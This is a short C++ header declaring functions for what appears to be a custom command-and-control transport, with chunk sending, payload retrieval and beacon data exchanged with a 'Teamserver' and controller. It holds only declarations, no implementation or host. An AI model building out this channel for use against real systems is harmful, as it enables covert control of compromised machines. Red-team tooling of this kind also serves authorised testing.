#pragma once
#include <vector>

std::vector<uint8_t> sendChunk(std::vector <uint8_t> chunkData);

std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId);

std::vector<uint8_t> getId();

std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId);

std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId);

void waitForControllerToComeOnline();